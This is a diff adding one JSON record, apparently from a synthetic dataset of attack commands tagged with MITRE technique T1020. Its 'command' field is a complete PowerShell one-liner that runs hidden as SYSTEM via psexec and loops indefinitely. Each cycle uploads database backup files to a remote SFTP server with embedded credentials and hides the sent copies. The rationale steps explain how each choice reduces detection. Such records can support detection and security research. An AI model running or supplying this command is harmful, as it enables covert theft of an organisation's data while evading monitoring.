@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true){ Get-ChildItem 'C:\\DB\\Exports' -Filter *.bak -File | ForEach-Object { curl -s -T `\"$($_.FullName)`\" sftp://user:pass@203.0.113.77/upload/ > $null 2>&1; if ($LASTEXITCODE -eq 0){ Move-Item -Force $_.FullName (Join-Path $sent $_.Name) } }; Start-Sleep 1800 }\"",
+  "explanation": "Automates exfiltration of database backup files to a remote SFTP server via curl, followed by moving completed items to a sent directory.",
+  "rationale_steps": [
+    "Run hidden as SYSTEM via PSExec for elevated, quiet execution.",
+    "Enumerate .bak files from a known export directory.",
+    "Upload with curl over SFTP using silent mode and suppress outputs.",
+    "Move successfully transferred files to prevent reprocessing.",
+    "Wait between cycles to reduce network signatures."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-0ca9ba54",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
